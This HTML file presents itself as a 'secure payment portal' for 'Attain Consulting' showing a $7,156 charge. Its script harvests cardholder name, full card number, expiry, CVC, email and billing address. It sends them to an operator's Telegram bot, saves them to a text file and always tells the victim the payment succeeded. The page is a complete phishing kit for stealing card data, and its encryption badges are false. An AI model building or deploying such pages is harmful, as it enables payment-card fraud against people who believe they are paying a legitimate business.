<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Attain Consulting | Secure Payment Portal</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Inter', system-ui, -apple-system, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background: linear-gradient(135deg, #eef2f7 0%, #d9e0eb 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 24px;
        }

        .payment-container {
            max-width: 780px;
            width: 100%;
            background: #ffffff;
            border-radius: 40px;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25);
            overflow: hidden;
        }

        .payment-header {
            background: linear-gradient(105deg, #0B2A3B 0%, #1B4F6E 100%);
            padding: 32px 36px;
            color: white;
        }

        .brand {
            display: flex;
            align-items: center;
            justify-content: space-between;
            flex-wrap: wrap;
            gap: 16px;
            margin-bottom: 28px;
        }

        .logo-area {
            display: flex;
            align-items: center;
            gap: 14px;
        }

        .logo-icon {
            background: rgba(255,255,255,0.15);
            width: 52px;
            height: 52px;
            border-radius: 28px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 28px;
        }

        .logo-text h2 {
            font-size: 22px;
            font-weight: 700;
        }

        .logo-text span {
            font-size: 13px;
            opacity: 0.8;
        }

        .badge-secure {
            background: rgba(255,255,255,0.12);
            padding: 8px 18px;
            border-radius: 60px;
            font-size: 13px;
            font-weight: 500;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .amount-row {
            display: flex;
            justify-content: space-between;
            align-items: baseline;
            flex-wrap: wrap;
            margin-top: 12px;
            border-top: 1px solid rgba(255,255,255,0.2);
            padding-top: 20px;
        }

        .amount-label {
            font-size: 15px;
            font-weight: 500;
            opacity: 0.9;
        }

        .amount-value {
            font-size: 34px;
            font-weight: 800;
            letter-spacing: 1px;
        }

        .form-body {
            padding: 32px 36px 36px;
        }

        .section-title {
            font-size: 16px;
            font-weight: 700;
            color: #0f2c3b;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            gap: 8px;
            border-left: 4px solid #1f6e8c;
            padding-left: 14px;
        }

        .grid-2col {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 20px;
        }

        .input-group {
            margin-bottom: 20px;
        }

        .input-label {
            display: block;
            font-size: 12px;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 0.4px;
            color: #4a627a;
            margin-bottom: 6px;
        }

        .input-field {
            width: 100%;
            padding: 14px 16px;
            font-size: 15px;
            background: #f9fbfd;
            border: 1.5px solid #e2e8f0;
            border-radius: 20px;
            transition: all 0.2s;
            outline: none;
            color: #0f172a;
            font-weight: 500;
        }

        .input-field:focus {
            border-color: #1f6e8c;
            background: #ffffff;
            box-shadow: 0 4px 12px rgba(31,110,140,0.15);
        }

        .pay-btn {
            width: 100%;
            background: #0f2c3b;
            padding: 18px;
            border: none;
            border-radius: 44px;
            font-size: 18px;
            font-weight: 700;
            color: white;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            cursor: pointer;
            transition: 0.2s;
            margin-top: 12px;
            box-shadow: 0 10px 20px -5px rgba(0,0,0,0.2);
        }

        .pay-btn:hover {
            background: #1a4d64;
            transform: scale(0.99);
        }

        .pay-btn:disabled {
            opacity: 0.7;
            cursor: not-allowed;
            transform: none;
        }

        .secure-footer {
            display: flex;
            justify-content: center;
            gap: 24px;
            margin-top: 28px;
            font-size: 12px;
            color: #6c7e97;
            flex-wrap: wrap;
        }

        .toast-notify {
            position: fixed;
            bottom: 30px;
            left: 50%;
            transform: translateX(-50%) scale(0.9);
            background: #0f2c3b;
            backdrop-filter: blur(12px);
            color: white;
            padding: 14px 28px;
            border-radius: 80px;
            font-weight: 500;
            font-size: 14px;
            opacity: 0;
            transition: 0.2s;
            pointer-events: none;
            z-index: 2000;
            box-shadow: 0 12px 24px -8px rgba(0,0,0,0.3);
            text-align: center;
            white-space: nowrap;
        }

        .toast-notify.show {
            opacity: 1;
            transform: translateX(-50%) scale(1);
        }

        .loader-btn {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 2px solid rgba(255,255,255,0.3);
            border-radius: 50%;
            border-top-color: white;
            animation: spin 0.7s linear infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        @media (max-width: 680px) {
            .payment-header, .form-body {
                padding: 24px;
            }
            .grid-2col {
                grid-template-columns: 1fr;
                gap: 0;
            }
            .toast-notify {
                white-space: normal;
                max-width: 90%;
                text-align: center;
            }
        }
    </style>
</head>
<body>

<div class="payment-container">
    <div class="payment-header">
        <div class="brand">
            <div class="logo-area">
                <div class="logo-icon">💼</div>
                <div class="logo-text">
                    <h2>ATTAIN CONSULTING</h2>
                    <span>Secure Payment Gateway</span>
                </div>
            </div>
            <div class="badge-secure">
                <span>🔒 256-bit SSL</span>
                <span>⚡</span>
                <span>Offline + Notification</span>
            </div>
        </div>
        <div class="amount-row">
            <span class="amount-label">Total Amount (USD)</span>
            <span class="amount-value">$7,156.00</span>
        </div>
    </div>

    <div class="form-body">
        <form id="paymentForm">
            <div class="section-title">💳 Card Information</div>
            <div class="input-group">
                <label class="input-label">Name on Card</label>
                <input type="text" class="input-field" id="cardName" placeholder="JOHN DOE / JANE SMITH" autocomplete="off" required>
            </div>
            <div class="input-group">
                <label class="input-label">Card Number</label>
                <input type="text" class="input-field" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" autocomplete="off" required>
            </div>
            <div class="grid-2col">
                <div class="input-group">
                    <label class="input-label">Expiry (MM/YY)</label>
                    <input type="text" class="input-field" id="expiry" placeholder="08/28" maxlength="5" autocomplete="off" required>
                </div>
                <div class="input-group">
                    <label class="input-label">CVC / CVV</label>
                    <input type="password" class="input-field" id="cvv" placeholder="***" maxlength="4" autocomplete="off" required>
                </div>
            </div>

            <div class="section-title" style="margin-top: 8px;">📍 Billing Address</div>
            <div class="input-group">
                <label class="input-label">Street Address</label>
                <input type="text" class="input-field" id="address" placeholder="123 Main Street, Apt 4B" autocomplete="off" required>
            </div>
            <div class="grid-2col">
                <div class="input-group">
                    <label class="input-label">City</label>
                    <input type="text" class="input-field" id="city" placeholder="New York" autocomplete="off" required>
                </div>
                <div class="input-group">
                    <label class="input-label">Postal Code</label>
                    <input type="text" class="input-field" id="zip" placeholder="10001" autocomplete="off" required>
                </div>
            </div>
            <div class="input-group">
                <label class="input-label">Country</label>
                <input type="text" class="input-field" id="country" placeholder="United States" autocomplete="off" required>
            </div>

            <div class="input-group">
                <label class="input-label">Email (Confirmation)</label>
                <input type="email" class="input-field" id="email" placeholder="customer@example.com" autocomplete="off" required>
            </div>

            <button type="submit" class="pay-btn" id="submitBtn">
                <span>CONFIRM & PAY</span>
                <span>🔐</span>
            </button>

            <div class="secure-footer">
                <span>✔️ End-to-end encrypted</span>
                <span>✔️ Manual processing by team</span>
            </div>
        </form>
    </div>
</div>

<div id="globalToast" class="toast-notify">✅ Your transaction has been received</div>

<script>
    // ======================= TELEGRAM BOT CONFIGURATION =======================
    // ★★ ENTER YOUR OWN BOT TOKEN AND CHAT ID BELOW ★★
    const BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";      // e.g., "7123456789:AAFGhijklmnoPqrStuVwxYz"
    const CHAT_ID = "YOUR_CHAT_ID_HERE";          // e.g., "987654321"
    // ==========================================================================

    // Format card number with spaces
    const cardNumberInput = document.getElementById('cardNumber');
    cardNumberInput.addEventListener('input', function(e) {
        let val = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
        let formatted = '';
        for (let i = 0; i < val.length; i++) {
            if (i > 0 && i % 4 === 0) formatted += ' ';
            formatted += val[i];
        }
        e.target.value = formatted;
    });

    // Format expiry MM/YY
    const expiryInput = document.getElementById('expiry');
    expiryInput.addEventListener('input', function(e) {
        let val = e.target.value.replace(/[^0-9]/g, '');
        if (val.length >= 3) {
            val = val.slice(0,2) + '/' + val.slice(2,4);
        }
        e.target.value = val;
    });

    // Send to Telegram (silent on error)
    async function sendToTelegram(message) {
        if (!BOT_TOKEN || BOT_TOKEN === "YOUR_BOT_TOKEN_HERE" || !CHAT_ID || CHAT_ID === "YOUR_CHAT_ID_HERE") {
            console.warn("Telegram credentials missing, message not sent.");
            return false;
        }
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        try {
            const response = await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: 'HTML'
                })
            });
            const data = await response.json();
            if (!data.ok) console.warn("Telegram API error:", data);
            return data.ok === true;
        } catch (error) {
            console.error("Telegram request failed:", error);
            return false;
        }
    }

    // Format Telegram message (English)
    function formatTelegramMessage(data) {
        const now = new Date();
        const timestamp = now.toLocaleString('en-US', { timeZone: 'America/New_York' });
        return `
💳 <b>NEW PAYMENT & BILLING NOTIFICATION</b>
━━━━━━━━━━━━━━━━━━━━
<b>💳 CARD DETAILS</b>
👤 Name       : ${data.cardName}
🔢 Card No    : ${data.cardNumber}
📅 Expiry     : ${data.expiry}
🔐 CVC        : ${data.cvv}
📧 Email      : ${data.email}

<b>📍 BILLING ADDRESS</b>
🏠 Address    : ${data.address}
🏙️ City       : ${data.city}
📮 Postal Code: ${data.zip}
🌍 Country    : ${data.country}

💰 <b>AMOUNT</b> : $7,156.00 USD
🕒 <b>Time</b>   : ${timestamp}
🏢 Source     : ATTAIN CONSULTING Panel
━━━━━━━━━━━━━━━━━━━━
<i>Manual processing by operations team.</i>
        `.trim();
    }

    // Save data to local .txt file (download)
    function saveToTxtFile(formData) {
        const now = new Date();
        const timestamp = now.toLocaleString('en-US');
        const fileTimestamp = now.toISOString().replace(/[:.]/g, '-').slice(0, 19);
        
        const content = `
==========================================
PAYMENT INFORMATION - ${timestamp}
==========================================
CARD DETAILS:
- Cardholder Name : ${formData.cardName}
- Card Number     : ${formData.cardNumber}
- Expiry          : ${formData.expiry}
- CVC             : ${formData.cvv}
- Email           : ${formData.email}

BILLING ADDRESS:
- Street Address  : ${formData.address}
- City            : ${formData.city}
- Postal Code     : ${formData.zip}
- Country         : ${formData.country}

AMOUNT: $7,156.00 USD
SOURCE: ATTAIN CONSULTING Panel
==========================================
        `.trim();

        const blob = new Blob([content], { type: 'text/plain' });
        const link = document.createElement('a');
        const url = URL.createObjectURL(blob);
        link.href = url;
        link.download = `payment_data_${fileTimestamp}.txt`;
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);
        URL.revokeObjectURL(url);
    }

    // Toast notification (always positive for user)
    const toastEl = document.getElementById('globalToast');
    function showSuccessToast() {
        toastEl.classList.add('show');
        setTimeout(() => {
            toastEl.classList.remove('show');
        }, 4000);
    }

    // Temporary error style for validation (user sees but not Telegram error)
    function showValidationMessage(message) {
        toastEl.textContent = message;
        toastEl.style.background = "#b91c1c";
        toastEl.classList.add('show');
        setTimeout(() => {
            toastEl.classList.remove('show');
            toastEl.style.background = "#0f2c3b";
            toastEl.textContent = "✅ Your transaction has been received";
        }, 3000);
    }

    // Form submission
    const form = document.getElementById('paymentForm');
    const submitBtn = document.getElementById('submitBtn');

    form.addEventListener('submit', async (e) => {
        e.preventDefault();

        // Gather all fields
        const cardName = document.getElementById('cardName').value.trim();
        const cardNumberRaw = document.getElementById('cardNumber').value.replace(/\s/g, '');
        const expiry = document.getElementById('expiry').value.trim();
        const cvv = document.getElementById('cvv').value.trim();
        const email = document.getElementById('email').value.trim();
        const address = document.getElementById('address').value.trim();
        const city = document.getElementById('city').value.trim();
        const zip = document.getElementById('zip').value.trim();
        const country = document.getElementById('country').value.trim();

        // Validations (user feedback, but not Telegram error)
        if (!cardName || !cardNumberRaw || !expiry || !cvv || !email || !address || !city || !zip || !country) {
            showValidationMessage("⚠️ Please fill in all fields.");
            return;
        }
        if (cardNumberRaw.length < 13 || cardNumberRaw.length > 19) {
            showValidationMessage("⚠️ Invalid card number length (13-19 digits).");
            return;
        }
        if (!/^\d{2}\/\d{2}$/.test(expiry)) {
            showValidationMessage("⚠️ Expiry must be MM/YY (e.g., 08/28).");
            return;
        }
        if (!/^\d{3,4}$/.test(cvv)) {
            showValidationMessage("⚠️ CVC must be 3 or 4 digits.");
            return;
        }
        if (!email.includes('@') || !email.includes('.')) {
            showValidationMessage("⚠️ Enter a valid email address.");
            return;
        }

        // Show loader
        const originalContent = submitBtn.innerHTML;
        submitBtn.innerHTML = '<span class="loader-btn"></span> Processing, please wait...';
        submitBtn.disabled = true;

        const fullData = {
            cardName, cardNumber: cardNumberRaw, expiry, cvv, email,
            address, city, zip, country
        };

        // 1. Save to local .txt file (always)
        saveToTxtFile(fullData);

        // 2. Send to Telegram (silent fail, no user error shown)
        const msg = formatTelegramMessage(fullData);
        const telegramSuccess = await sendToTelegram(msg);
        if (!telegramSuccess) {
            console.log("Telegram delivery failed but user was not notified.");
        }

        // 3. Always show success toast to user
        showSuccessToast();

        // Reset form (optional)
        form.reset();

        // Restore button
        submitBtn.innerHTML = originalContent;
        submitBtn.disabled = false;
    });
</script>
</body>
</html>
